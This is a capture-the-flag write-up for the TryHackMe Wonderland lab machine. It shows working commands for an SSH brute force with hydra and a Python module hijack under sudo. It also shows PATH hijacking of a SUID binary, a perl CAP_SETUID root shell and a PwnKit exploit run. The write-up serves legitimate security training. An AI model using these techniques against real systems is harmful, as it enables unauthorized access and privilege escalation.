# Wonderland Write-up 
https://tryhackme.com/room/wonderland
by Herman Detwiler

[Overview](#overview)

[Recon](#recon)

[Service Enumeration](#service-enumeration)

[Initial Access](#initial-access)

[Privilege Escalation #1](#privilege-escalation-1)

[Privilege Escalation #2](#privilege-escalation-2)

[Privilege Escalation #3](#privilege-escalation-3)

[Proof of Compromise](#proof-of-compromise)

[Alternate path to root](#alternate-path-to-root)

# Overview

Wonderland was a medium difficulty machine, that I thouroughly enjoyed (not just because I personally love Alice in Wonderland). Initial access was achieved via an SSH brute force with a custom wordlist. From there a python library injection attack got us to the next user in the chain of compromise. After we are on this new user it is possible to exploit a binary that isn't using the full path for one of the calls being made, allowing for a custom bash script to be written gaining us access to another user. This final user that we gain access too is able to run perl with a dangerous setting enabled allowing us to get root on the machine.

# Recon

Initial recon on this machine was done using nmap, where 2 tcp ports were found to be open: 80 (HTTP) and 22 (ssh).

## Nmap output:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Service Enumeration

## TCP port 80-HTTP

Initial service enumeration of port 80 was done using Wfuzz to conduct a directory brute force.

First I always like to export the ip address as well as the url as environment vaiables to use for further commands:

```bash
└─$ export ip=10.10.16.97  
└─$ export url=http://$ip
```
Then I can run the following to:
```bash
#1. Brute force directories
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 $url/FUZZ

#2. Brute force files
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 $url/FUZZ
```
This gave the following output
```bash
000000061:   301        0 L      0 W        0 Ch        "index.html"
000000371:   301        0 L      0 W        0 Ch        "."             
000000788:   200        10 L     24 W       217 Ch      "main.css"         
000000045:   301        0 L      0 W        0 Ch        "img"                                             
000000389:   301        0 L      0 W        0 Ch        "r"                                               
000004255:   200        9 L      44 W       402 Ch      "http://10.10.16.97:80/"                         
000009353:   301        0 L      0 W        0 Ch        "poem"   
```
Manually inspecting the content, it all seems like a static website so far, however the /r directory caught my interest, so I decided to continue to brute force that. First I made a custom wordlist containing the lowercase alaphabet:

```bash
└─$ for i in {a..z};do echo $i >> letters;done
                                                                                                                                                                                                                                             
┌──(nith㉿kastle)-[~/CTF/THM/Wonderland]
└─$ cat letters                         
a
b
c
d
e
f
g
h
i
j
k
l
m
n
o
p
q
r
s
t
u
v
w
x
y
z
```
Then, being that this was a rather small list, I once again used wfuzz but with the recusive flag set, and found that the directories spelled out rabbit:

```bash
└─$ wfuzz -c -w letters --hc 404 -R20 $url/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.16.97:80/r/FUZZ
Total requests: 26

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                            
=====================================================================

000000001:   301        0 L      0 W        0 Ch        "a"                                                
 |_  Enqueued response for recursion (level=2) 
000000051:   301        0 L      0 W        0 Ch        "a - b"                                            
 |_  Enqueued response for recursion (level=3) 
000000077:   301        0 L      0 W        0 Ch        "a - b - b"                                        
 |_  Enqueued response for recursion (level=4) 
000000096:   301        0 L      0 W        0 Ch        "a - b - b - i"                                    
 |_  Enqueued response for recursion (level=5) 
000000111:   301        0 L      0 W        0 Ch        "a - b - b - i - t"                                
 |_  Enqueued response for recursion (level=6) 

```

Still just contained static content, so my next step was going to be able to try and make a wordlist to brute force SSH.

# Initial Access

## Creating a custom wordlist to brute force SSH

First thing I needed to do was get a list of names, I did this part manually as not many names existed within the static site.Since I am not sure if the first letter will be upper or lowercase lets try both:
```bash
└─$ cat usernames                  
Alice
alice
rabbit
Rabbit
Hatter
hatter
Hare
hare
Cat
cat
```
Next lets grab all the words we have found on the website using cewl:

```bash

┌──(nith㉿kastle)-[~/CTF/THM/Wonderland]
└─$ cewl -d 1 -m 4 http://10.10.16.97/ > passwords                                                                               
┌──(nith㉿kastle)-[~/CTF/THM/Wonderland]
└─$ cewl -d 1 -m 4 http://10.10.16.97/r >> passwords   

┌──(nith㉿kastle)-[~/CTF/THM/Wonderland]
└─$ cewl -d 1 -m 4 http://10.10.16.97/poem >> passwords

┌──(nith㉿kastle)-[~/CTF/THM/Wonderland]
└─$ cewl -d 1 -m 4 http://10.10.16.97/r/a >> passwords

┌──(nith㉿kastle)-[~/CTF/THM/Wonderland]
└─$ cewl -d 1 -m 4 http://10.10.16.97/r/a/b >> passwords

┌──(nith㉿kastle)-[~/CTF/THM/Wonderland]
└─$ cewl -d 1 -m 4 http://10.10.16.97/r/a/b/b >> passwords

┌──(nith㉿kastle)-[~/CTF/THM/Wonderland]
└─$ cewl -d 1 -m 4 http://10.10.16.97/r/a/b/b/i >> passwords

┌──(nith㉿kastle)-[~/CTF/THM/Wonderland]
└─$ cewl -d 1 -m 4 http://10.10.16.97/r/a/b/b/i/t >> passwords
```
next lets make it so all the passwords are unique:

```bash
└─$ cat passwords|sort -u>t
                                                                                             
┌──(nith㉿kastle)-[~/CTF/THM/Wonderland]
└─$ cat t>passwords        
                     
```


Checking how many passwords were added to the list with wc I see that I have 148 unique passwords

```bash
└─$ wc passwords                    
 148  154 1065 passwords

```

## ssh bruteforce with hydra

With these lists I am able to bruteforce alice's password quickly with hydra:

```bash
└─$ hydra -L usernames -P passwords 10.10.16.97 ssh 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-02 14:45:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1470 login tries (l:10/p:147), ~92 tries per task
[DATA] attacking ssh://10.10.16.97:22/

[STATUS] 164.00 tries/min, 164 tries in 00:01h, 1308 to do in 00:08h, 14 active
[22][ssh] host: 10.10.16.97   login: alice   password: <removed find it yourself : P>
[STATUS] 157.00 tries/min, 471 tries in 00:03h, 1001 to do in 00:07h, 14 active

```

From there I create a quick bash script to let me ssh in without having to remeber the password each time.

```bash
└─$ cat ssh-in                  
#!/bin/bash
# simple script to ssh into the alice account


# copy password to clipboard
echo <removed find it yourself : P> | xclip -selection clipboard

# ssh as alice
ssh alice@10.10.16.97
```

```bash
└─$ ./ssh-in                         
The authenticity of host '10.10.16.97 (10.10.16.97)' can't be established.
ECDSA key fingerprint is SHA256:HUoT05UWCcf3WRhR5kF7yKX1yqUvNhjqtxuUMyOeqR8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.16.97' (ECDSA) to the list of known hosts.
alice@10.10.16.97's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Dec  2 19:54:51 UTC 2022

  System load:  0.1                Processes:           90
  Usage of /:   18.9% of 19.56GB   Users logged in:     0
  Memory usage: 14%                IP address for eth0: 10.10.16.97
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
alice@wonderland:~$ 
```
# Privilege Escalation 1

Checking sudo -l I can see that alice can run a single command as the rabbit:

```bash
alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Sorry, try again.
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
alice@wonderland:~$ 

```

However this file is owned by root:

```bash
alice@wonderland:~$ ls -lah /home/alice/walrus_and_the_carpenter.py
-rw-r--r-- 1 root root 3.5K May 25  2020 /home/alice/walrus_and_the_carpenter.py
```

This script seems to just pick random lines from a lewis carrol poem and spit them out:

```python
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.

# removed to save space (trust me it was just more poem)

"O Oysters," said the Carpenter.
"You’ve had a pleasant run!
Shall we be trotting home again?"
But answer came there none —
And that was scarcely odd, because
They’d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))

```
however, this is importing a module and exists in my home directory (where I have write permission), lets see if we can make a new module called random.py and have it do something else; like spawning a bash shell:

```bash
alice@wonderland:~$ cat random.py 
#!/bin/env python3
import os
os.system("/bin/bash")
```
Now random will spawn a bash shell as the user rabbit using sudo:

```bash
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$ whoami
rabbit
```
# Privilege Escalation 2

Looking in the rabbit's home directory I find a file owned by root that is a SUID;

```bash
rabbit@wonderland:/home/rabbit$ ls
teaParty
rabbit@wonderland:/home/rabbit$ ls -la
total 40
drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 .
drwxr-xr-x 6 root   root    4096 May 25  2020 ..
lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
rabbit@wonderland:/home/rabbit$ file teaParty
teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped
```
running the program

```bash
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Fri, 02 Dec 2022 21:11:01 +0000
Ask very nicely, and I will give you some tea while you wait for him
```

Well I don't want to wait an hour, lets spin up a server and grab the binary to reverse engineer it:

```bash
rabbit@wonderland:/home/rabbit$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.6.4.8 - - [02/Dec/2022 20:15:05] "GET /teaParty HTTP/1.1" 200 -
```

```bash
└─$ wget http://10.10.16.97:8000/teaParty                                               8 ⨯
--2022-12-02 15:14:05--  http://10.10.16.97:8000/teaParty
Connecting to 10.10.16.97:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16816 (16K) [application/octet-stream]
Saving to: ‘teaParty’

teaParty                100%[============================>]  16.42K  --.-KB/s    in 0.09s   

2022-12-02 15:14:05 (186 KB/s) - ‘teaParty’ saved [16816/16816]

```

Then I can check what the binary is doing, but first I am just going to run strings to see any readable infomation I can glean from the binary:

```bash
└─$ strings teaParty                                                                         
/lib64/ld-linux-x86-64.so.2                                                                  
2U~4                                                                                         
libc.so.6                                                                                    
setuid                                                                                       
puts                                                                                         
getchar                                                                                      
system                                                                                       
__cxa_finalize                                                                               
setgid                                                                                       
__libc_start_main                                                                            
GLIBC_2.2.5                                                                                  
_ITM_deregisterTMCloneTable                                                                  
__gmon_start__                                                                               
_ITM_registerTMCloneTable                                                                    
u/UH                                                                                         
[]A\A]A^A_                                                                                   
Welcome to the tea party!                                                                    
The Mad Hatter will be here soon.                                                            
/bin/echo -n 'Probably by ' && date --date='next hour' -R                                    
Ask very nicely, and I will give you some tea while you wait for him                         
Segmentation fault (core dumped)                                                             
;*3$"                                                                                        
GCC: (Debian 8.3.0-6) 8.3.0                                                                  
crtstuff.c                                              
```

I can take advantage of the fact that this script is using date without using the full path by creating a new date executable in the same directory being run. First step is going to be adding the rabbit's home directory to PATH:


## Upadting path
```bash
rabbit@wonderland:/home/rabbit$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
rabbit@wonderland:/home/rabbit$ export PATH=$(pwd):$PATH
rabbit@wonderland:/home/rabbit$ echo $PATH
/home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
rabbit@wonderland:/home/rabbit$ 
```

## Creating a date POC

Next let's make a new date command:

```bash
rabbit@wonderland:/home/rabbit$ echo '#!/bin/bash'>date;echo id >>date;chmod +x date
rabbit@wonderland:/home/rabbit$ cat date
#!/bin/bash
id
rabbit@wonderland:/home/rabbit$ ls -la date
-rwxr-xr-x 1 rabbit rabbit 15 Dec  3 17:20 date
rabbit@wonderland:/home/rabbit$ date
uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
rabbit@wonderland:/home/rabbit$ 
```

Now let's see if the funtionality of the teaParty binary has changed:

```bash
rabbit@wonderland:/home/rabbit$ teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
Ask very nicely, and I will give you some tea while you wait for him
```

Awesome we can change the execution of the binary! (see how the uid is now saying we are effectively the hatter).

## Creating a dash shell

now instead of id, lets create an exploit to run sh with the -p flag to maintain permissions:

```bash
rabbit@wonderland:/home/rabbit$ cat date
#!/bin/bash
/bin/sh -p
```


And now running teaParty will make me the hatter:
```bash
rabbit@wonderland:/home/rabbit$ teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by $ whoami
hatter
```

Searching the hatter's home directory I find that there is a password for him inside a file which I am able to use to switch to the hatter (instead of just having the effective uid of the hatter.

# Privilege Escalation 3


The final part of the puzzle is seeing that perl has the CAP_SETUID capability set(identified using linpeas).

```bash
Files with capabilities (limited to 50):                                                                                                                                                      
/usr/bin/perl5.26.1 = cap_setuid+ep                                                                                                                                                           
/usr/bin/mtr-packet = cap_net_raw+ep                                                                                                                                                          
/usr/bin/perl = cap_setuid+ep        
```

While this was actually discovered back when I first got on the box, I could see that I was going to need to find a way to become the hatter before exploiting it.

```bash
rabbit@wonderland:/home/rabbit$ ls -la /usr/bin/perl
-rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl
rabbit@wonderland:/home/rabbit$ ls -la /usr/bin/perl5.26.1
-rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl5.26.1
```

Now that I am the hatter I can read a password file in his home directory:

```bash
$ cd /home
$ dir
alice  hatter  rabbit  tryhackme
$ cd hatter
$ dir
password.txt
$ cat password.txt
<removed find it yourself : P>
```

This allows me to switch to the hatter user, and therefore have the ability to run perl

This is from gtfobins:


**Capabilities**

*If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.*

```bash
cp $(which perl) .
sudo setcap cap_setuid+ep perl

./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

## Exploit: perl's CAP_SETUID set


```bash
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# whoami
root
```
# Proof of Compromise

## user.txt
```bash
# id 
uid=0(root) gid=1003(hatter) groups=1003(hatter)

# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:44:b0:81:c6:d7 brd ff:ff:ff:ff:ff:ff
    inet 10.10.16.97/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 1995sec preferred_lft 1995sec
    inet6 fe80::44:b0ff:fe81:c6d7/64 scope link 
       valid_lft forever preferred_lft forever

# cat /root/user.txt
thm{<removed find it yourself : P>}

# hostname
wonderland
```

## root.txt

```bash
# whoami;id;hostname;ip a;cat /home/alice/root.txt
root

uid=0(root) gid=1003(hatter) groups=1003(hatter)

wonderland

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:44:b0:81:c6:d7 brd ff:ff:ff:ff:ff:ff
    inet 10.10.16.97/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 1812sec preferred_lft 1812sec
    inet6 fe80::44:b0ff:fe81:c6d7/64 scope link 
       valid_lft forever preferred_lft forever

thm{<removed find it yourself : P>}
```


# Alternate Path to Root

Okay, so I ended up doing this after just for fun, because this machine was released before the disclosure of this CVE: this certainly was not the intended path. Also it is so easy that you don't learn anything doing it...so I highly suggest going the intended route.

## CVE-2021-4034 (pwnkit)

ref:
https://github.com/joeammond/CVE-2021-4034


With this exploit you can actually get root straight from alice:

```bash
alice@wonderland:~$ python3 CVE-2021-4034.py
[+] Creating shared library for exploit code.
[+] Calling execve()
# whoami
root
# 
```
